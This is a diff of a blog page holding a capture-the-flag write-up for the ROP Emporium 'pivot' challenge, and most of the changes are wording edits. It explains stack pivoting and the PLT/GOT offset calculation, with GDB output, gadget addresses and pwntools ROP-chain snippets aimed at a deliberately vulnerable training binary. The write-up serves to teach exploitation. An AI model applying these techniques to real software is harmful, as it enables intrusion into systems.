@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="Saurabh Mittal ">
-<meta name="description" content="I recently came across the ropemporium challenges while looking for resources to learn Return Oriented Programming (ROP). The challenges are very good and the difficulty increases with the problems which keeps things interesting. The challenge this writeup is about is the pivot challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for both 32 and 64 bit." />
+<meta name="description" content="I recently came across the ropemporium challenges while looking for resources to learn Return Oriented Programming (ROP). I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the pivot challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version." />
 <meta name="keywords" content=", ctf, rop, pivot" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#252627" />
@@ -40,12 +40,12 @@
     <meta name="theme-color" content="#252627">
 
 <meta itemprop="name" content="ROP Emporium - Pivot Writeup">
-<meta itemprop="description" content="I recently came across the ropemporium challenges while looking for resources to learn Return Oriented Programming (ROP). The challenges are very good and the difficulty increases with the problems which keeps things interesting. The challenge this writeup is about is the pivot challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for both 32 and 64 bit.">
+<meta itemprop="description" content="I recently came across the ropemporium challenges while looking for resources to learn Return Oriented Programming (ROP). I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the pivot challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version.">
 
 
-<meta itemprop="datePublished" content="2020-04-05T15:40:35&#43;05:30" />
-<meta itemprop="dateModified" content="2020-04-05T15:40:35&#43;05:30" />
-<meta itemprop="wordCount" content="1701">
+<meta itemprop="datePublished" content="2020-04-05T22:00:35&#43;05:30" />
+<meta itemprop="dateModified" content="2020-04-05T22:00:35&#43;05:30" />
+<meta itemprop="wordCount" content="1768">
 
 
 
@@ -54,13 +54,13 @@
 <meta name="twitter:image" content="https://saurabhmittal16.github.io"/>
 
 <meta name="twitter:title" content="ROP Emporium - Pivot Writeup"/>
-<meta name="twitter:description" content="I recently came across the ropemporium challenges while looking for resources to learn Return Oriented Programming (ROP). The challenges are very good and the difficulty increases with the problems which keeps things interesting. The challenge this writeup is about is the pivot challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for both 32 and 64 bit."/>
+<meta name="twitter:description" content="I recently came across the ropemporium challenges while looking for resources to learn Return Oriented Programming (ROP). I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the pivot challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version."/>
 
 
 
 
 
-    <meta property="article:published_time" content="2020-04-05 15:40:35 &#43;0530 IST" />
+    <meta property="article:published_time" content="2020-04-05 22:00:35 &#43;0530 IST" />
 
 
 
@@ -121,7 +121,7 @@
     <main class="post">
 
         <div class="post-info">
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>8 minutes
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>9 minutes
 
             
 
@@ -138,9 +138,9 @@
             <div class="post-content">
                 
 
-<p>I recently came across the <a href="https://ropemporium.com/" target="_blank">ropemporium</a> challenges while looking for resources to learn Return Oriented Programming (ROP). The challenges are very good and the difficulty increases with the problems which keeps things interesting. The challenge this writeup is about is the <a href="https://ropemporium.com/challenge/pivot.html" target="_blank">pivot</a> challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for both 32 and 64 bit.</p>
+<p>I recently came across the <a href="https://ropemporium.com/" target="_blank">ropemporium</a> challenges while looking for resources to learn <a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank">Return Oriented Programming (ROP)</a>. I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the <a href="https://ropemporium.com/challenge/pivot.html" target="_blank">pivot</a> challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version.</p>
 
-<p>The problem description gives a clear explanation of what has to be done</p>
+<p>The problem description gives a basic idea of what needs to be done</p>
 
 <blockquote>
 <p>There&rsquo;s only enough space for a three-link chain on the stack but you&rsquo;ve been given space to stash a much larger ROP chain elsewhere. Learn how to pivot the stack onto a new location.</p>
@@ -148,7 +148,7 @@
 
 <h2 id="exploring-the-binary">Exploring the binary</h2>
 
-<p>I start by executing the binary and it expects two different inputs from the user. The print statements of binary make it clear that the second input should be used to overflow the stack and pivot it and the first input is where the main ROP chain should be kept.</p>
+<p>I started by executing the binary and it expects two different inputs from the user. The print statements of binary make it clear that the second input should be used to overflow the stack and pivot it and the first input is for the main ROP chain.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pivot by ROP Emporium
 32bits
 
@@ -160,25 +160,26 @@ Now kindly send your stack smash
 &gt; world
 
 Exiting</code></pre></div>
-<p>The address printed by the binary most probably is the address where the longer chain is stored (heap). We can check this by opening the binary with GDB.</p>
+<p>The address printed by the binary is most probably the address where the longer chain is stored (heap). We can confirm this by debugging the binary with GDB.</p>
 
-<p>Before getting into debugging the binary, I have made some assumptions that readers are aware of a few things about the binaries of these challenges. Every binary has a pwnme function which uses the vulnerable <code>gets()</code> function which is used to overwrite the return pointer. The return pointer can be overwritten by 44 bytes of padding. And each binary has a function named either uselessFunction or usefulFunction which has useful assembly. This binary has a <code>uselessFunction()</code> which calls the <code>foothold_function</code>, more on it later.</p>
+<p>Before getting into debugging the binary, I would like to state some things that I assume readers already know (if they have solved any of the previous challenges). Every binary has a <code>pwnme</code> function which uses the vulnerable <code>gets()</code> function which is used to overwrite the return pointer. The return pointer can be overwritten by 44 bytes of padding. And each binary has a function named either uselessFunction or usefulFunction which has useful assembly. This binary has a <code>uselessFunction()</code> which calls the <code>foothold_function</code>which is very important for this challenge but more on it later.</p>
 
-<p>Now getting back to the address received from the binary. We open binary with GDB and disassemble the <code>pwnme</code> function and set a breakpoint after the first <code>fgets</code> call (at pwnme + 114). Run the program and enter a string like <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>.
-GDB breaks and a new address is printed by the binary (<code>0xf7dc8f10</code> in this case). On examining this address, we find the value <code>0x414141</code> multiple times which is ASCII value of &lsquo;A&rsquo; in hexadecimal.</p>
+<p>Now getting back to the address received from the binary. We open the binary with GDB and disassemble the <code>pwnme</code> function and set a breakpoint after the first <code>fgets</code> call (at pwnme + 114). Run the program and enter a string like <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>.
+GDB breaks and the address is printed by the binary (<code>0xf7dc8f10</code> in this case). On examining this address, we find the value <code>0x414141</code> multiple times which is ASCII value of &lsquo;A&rsquo; in hexadecimal.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; x/20wx 0xf7dc8f10
 0xf7dc8f10: 0x41414141 0x41414141 0x41414141 0x41414141
 0xf7dc8f20: 0x41414141 0x41414141 0x41414141 0x41414141
 0xf7dc8f30: 0x41414141 0x41414141 0x41414141 0x41414141
 0xf7dc8f40: 0x41414141 0x41414141 0x41414141 0x41414141
 0xf7dc8f50: 0x0000000a 0x00000000 0x00000000 0x00000000</code></pre></div>
-<p>This confirms that the address recevied from binary is where the longer chain will be stored.</p>
+<p>This confirms that the address received from binary is where the longer chain will be stored.</p>
 
 <h2 id="pivot-the-stack">Pivot the stack</h2>
 
-<p>The next step is to build the shorter ROP chain which pivots the stack but what does pivoting the stack mean? In simple terms, pivoting the stack means to make the stack pointer (<code>ESP</code>) point to a memory location which we control instead of the stack of the binary. So, all we need to do is make <code>ESP</code> point to the address where are longer ROP chain will be stored.</p>
+<p>The next step is to build the shorter ROP chain which pivots the stack but what does pivoting the stack mean?
+In simple terms, pivoting the stack means to make the stack pointer (<code>ESP</code>) point to a memory location which we control instead of the actual stack. So, all we need to do is make <code>ESP</code> point to the address where are longer ROP chain will be saved.</p>
 
-<p>For this we need gadgets that can load the value from stack into any of the registers and then mov the value of that register in <code>ESP</code>. The available gadgets can be found using <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank">ROPGadget</a>. On running the script on our pivot32 binary, ROPGadget found 160 unique gadgets. One of them is the <code>xchg eax, esp ; ret</code> gagdet which exchanges the value of <code>EAX</code> and <code>ESP</code>. It seems like this gadget was placed intentionally in the binary and that it is the case. The binary contains a function <code>usefulGadgets</code> which contains some useful gadgets.</p>
+<p>For this, we need gadgets that can load the value from stack into any of the registers and then move the value of that register in <code>ESP</code>. The gadgets available inside a binary can be found using <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank">ROPGadget</a>. On running the script on our <code>pivot32</code> binary, it found 160 unique gadgets. One of them is the <code>xchg eax, esp ; ret</code> gadget which exchanges the value of <code>EAX</code> and <code>ESP</code>. It seems like this gadget was placed intentionally in the binary and that it is the case. The binary contains a function <code>usefulGadgets</code> which contains some useful gadgets.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; disass usefulGadgets
 Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulGadgets:
    0x080488c0 &lt;+0&gt;:  pop    eax
@@ -193,7 +194,7 @@ Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color
    0x080488cc &lt;+12&gt;: xchg   ax,ax
    0x080488ce &lt;+14&gt;: xchg   ax,ax
 End of assembler dump.</code></pre></div>
-<p>Other gadget used for the pivoting is <code>pop eax ; ret</code>. This pops a value from the stack and moves it into <code>EAX</code> register. So let&rsquo;s start building the exploit script using pwntools. Here is the first snippet of the script which loads the binary and extracts the address from the output.</p>
+<p>Other gadget used for the pivoting is <code>pop eax ; ret</code>. This pops a value from the stack and moves it into <code>EAX</code> register. So let&rsquo;s start building the exploit script using <code>pwntools</code>. Here is a snippet of the script which loads the binary and extracts the address from the output. Some basic regex is used to extract the address.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">import</span> re
 
@@ -216,13 +217,13 @@ pop_eax <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0
 
 <span style="color:#75715e"># xchg eax, esp ; ret</span>
 xchg <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c2</span>)</code></pre></div>
-<p>The short ROP chain is built in a way that after returning from <code>pwnme</code>, the <code>pop_eax</code> gadget is executed and then the exchange gadget is called.</p>
+<p>The short ROP chain is built such that after returning from <code>pwnme</code>, the <code>pop_eax</code> gadget is executed and then the exchange gadget is called.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># short chain for overflowing stack and pivoting stack to longer chain</span>
 short <span style="color:#f92672">=</span> padding
 short <span style="color:#f92672">+=</span> pop_eax
 short <span style="color:#f92672">+=</span> addr
 short <span style="color:#f92672">+=</span> xchg</code></pre></div>
-<p>When <code>pop_eax</code> is executed, the top of stack is the address where longer chain is stored, therefore it pops that value into the <code>EAX</code> register. Now <code>EAX</code> contains the address of longer chain. The <code>xchg</code> gadget swaps the values and now <code>ESP</code> contains the required address. The longer chain is currently set to some junk value <code>0xdeadbeef</code>. We can check this script by running this script and attaching GDB.</p>
+<p>When <code>pop_eax</code> is executed, the top of the stack is the address where longer chain is saved, therefore it pops that value into the <code>EAX</code> register. Now <code>EAX</code> contains the address of long chain. The <code>xchg</code> gadget swaps the values and now <code>ESP</code> contains the required address. The longer chain is currently set to some junk value like <code>0xdeadbeef</code>. We can check this script by running this script and attaching GDB.</p>
 
 <p>Breaking at <code>ret</code> of <code>pwnme</code> shows the path we are going to follow -</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> ► 0x804889f &lt;pwnme+173&gt;           leave
@@ -233,7 +234,7 @@ short <span style="color:#f92672">+=</span> xchg</code></pre></div>
 
    0x80488c2 &lt;usefulGadgets+2&gt;     xchg   eax, esp
    0x80488c3 &lt;usefulGadgets+3&gt;     ret</code></pre></div>
-<p>And after exchange is executed, <code>ESP</code> points to the address where longer chain is stored and the program will try executing instructions saved in the longer chain which contains <code>0xdeadbeef</code> right now.</p>
+<p>And after the exchange gadget is executed, <code>ESP</code> points to the address where longer chain is saved and the program tries executing the instructions saved at that address. GDB gets a segmentation fault since the address contains<code>0xdeadbeef</code> at this stage.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">   0x804889f &lt;pwnme+173&gt;          leave
    0x80488a0 &lt;pwnme+174&gt;          ret
     ↓
@@ -252,19 +253,19 @@ short <span style="color:#f92672">+=</span> xchg</code></pre></div>
  EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
  ESP  0xf7dc6f10 ◂— 0xdeadbeef
  EIP  0x80488c3 <span style="color:#f92672">(</span>usefulGadgets+3<span style="color:#f92672">)</span> ◂— ret</code></pre></div>
-<p>We have successfuly pivoted the stack to the desired address and now the longer ROP chain has to be built to get the flag.</p>
+<p>We have successfully pivoted the stack to the desired address and now the longer ROP chain has to be built to get the flag.</p>
 
-<h2 id="rest-of-the-challenge">Rest of the challenge</h2>
+<h2 id="getting-the-flag">Getting the flag</h2>
 
 <h3 id="plt-and-got">PLT and GOT</h3>
 
-<p>On reading the rest of the problem description, it is understood that we need to call the <code>ret2win</code> function dynamically imported from <code>libpivot32.so</code>. But instead of <code>ret2win</code>, another function from the same library, <code>foothold_function</code> is imported and used in the binary. The rest of the challenge requires the knowledge of PLT and GOT and their working. You can read about them in the Appendix A of ropemporium&rsquo;s <a href="https://ropemporium.com/guide.html" target="_blank">beginner&rsquo;s guide</a>. I would also suggest <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4" target="_blank">this</a> video since it explains the working with an example binary.</p>
+<p>On reading the rest of the problem description, it is understood that we need to call the <code>ret2win</code> function dynamically imported from <code>libpivot32.so</code>. But instead of <code>ret2win</code>, another function from the same library, <code>foothold_function</code> is imported and used in the binary. The rest of the challenge requires the knowledge of PLT and GOT and their working. You can read about them in Appendix A of ropemporium&rsquo;s <a href="https://ropemporium.com/guide.html" target="_blank">beginner&rsquo;s guide</a>. I would also suggest <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4" target="_blank">this</a> video since it explains the working with a working example.</p>
 
-<p>The <code>foothold_function</code> has an entry in the GOT but it needs to be populated. So, the function has to be called. We also have to find the offset between the <code>foothold_function</code> and the <code>ret2win</code> function in <code>libpivot32.so</code>. Once, the GOT entry is populated, the address of desired function can be calculated by adding the offset to the dynamic address of <code>foothold_function</code> and calling it.</p>
+<p>The <code>foothold_function</code> has an entry in the GOT but it needs to be populated. So, the function has to be called. We also have to find the offset between the <code>foothold_function</code> and the <code>ret2win</code> function in <code>libpivot32.so</code>. Once, the GOT entry is populated, the address of the desired function can be calculated by adding the offset to the address of <code>foothold_function</code> and calling it.</p>
 
 <h3 id="finding-the-offset">Finding the offset</h3>
 
-<p>I used <code>objdump</code> command to dump the source assembly of <code>libpivot32.so</code> and <code>grep</code> to find their offsets.</p>
+<p>I used <code>objdump</code> command to dump the source assembly of <code>libpivot32.so</code> and <code>grep</code> to find their offsets from the start of the binary.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -S libpivot32.so | grep foothold_function
 <span style="color:#ae81ff">00000770</span> &lt;foothold_function&gt;:
 
@@ -277,13 +278,13 @@ $ objdump -S libpivot32.so | grep ret2win
 <p>To add offsets into registers and load data from memory, we need gadgets. Here are the gadgets used -</p>
 
 <ol>
-<li><p><code>pop ebx ; ret</code> - This is used to load a value from the top of stack to <code>EBX</code>.</p></li>
+<li><p><code>pop ebx ; ret</code> - This is used to load a value from the top of the stack to <code>EBX</code>.</p></li>
 
 <li><p><code>add eax, ebx ; ret</code> - This will add the value of <code>EBX</code> and <code>EAX</code> and store it in <code>EAX</code></p></li>
 
 <li><p><code>mov eax, dword ptr [eax] ; ret</code> - This loads the value stored at the value in <code>EAX</code>. In simple terms, it uses the value in <code>EAX</code> as an address and the value at that address is moved into <code>EAX</code></p></li>
 
-<li><p><code>call eax</code> - This will call the address in <code>EAX</code> (should be a function)</p></li>
+<li><p><code>call eax</code> - This will call the address in <code>EAX</code> (should be the address of a function)</p></li>
 </ol>
 
 <h3 id="building-the-rop-chain">Building the ROP chain</h3>
@@ -313,9 +314,9 @@ pop_ebx <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0
 add <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c7</span>)
 
 offset <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x1f7</span>)</code></pre></div>
-<p>The longer ROP chain is initialised with the PLT value of <code>foothold_function</code> since we need to call this to populate the GOT entry.</p>
+<p>The longer ROP chain is initialised with the PLT value of <code>foothold_function</code> since the first thing we need is to call this function to populate the GOT entry.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">=</span> foothold_plt</code></pre></div>
-<p>After this the GOT entry contains the address of <code>foothold_function</code> in <code>libpivot32.so</code> which is brought into memory when required. First the address of GOT entry is moved in <code>EAX</code> and then using the <code>mov eax, dword ptr [eax] ; ret</code> gadget, the address of imported function is moved to <code>EAX</code>.</p>
+<p>After this, the GOT entry contains the address of <code>foothold_function</code> in the memory. The <code>libpivot32.so</code> is brought into memory when required and assigned a starting memory address. First, the address of GOT entry is moved in <code>EAX</code> and then using the <code>mov eax, dword ptr [eax] ; ret</code> gadget, the address of the imported function is moved to <code>EAX</code>(saved at the GOT entry).</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">+=</span> pop_eax
 long <span style="color:#f92672">+=</span> foothold_got
 long <span style="color:#f92672">+=</span> eax_val</code></pre></div>
@@ -341,7 +342,7 @@ Now kindly send your stack smash
 &gt;
 foothold_function<span style="color:#f92672">()</span>, check out my .got.plt entry to gain a foothold into libpivot.so
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ROPE<span style="color:#f92672">{</span>a_placeholder_32byte_flag!<span style="color:#f92672">}</span></code></pre></div>
-<p>That&rsquo;s the end of this post. This is a great challenge and is great for beginners. Cheers!</p>
+<p>That&rsquo;s the end of this post. I think that this is a great challenge for beginners since the challenge is not too difficult but still interesting to work on. Thanks for reading. Cheers!</p>
 
             </div>
         </article>
@@ -353,9 +354,9 @@ foothold_function<span style="color:#f92672">()</span>, check out my .got.plt en
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://saurabhmittal16.github.io/tags/ctf">ctf</a></span><span class="tag"><a href="https://saurabhmittal16.github.io/tags/rop">rop</a></span><span class="tag"><a href="https://saurabhmittal16.github.io/tags/pivot">pivot</a></span>
                 </p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1701 Words</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1768 Words</p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-04-05 15:40 &#43;0530</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-04-05 22:00 &#43;0530</p>
         </div>
 
         
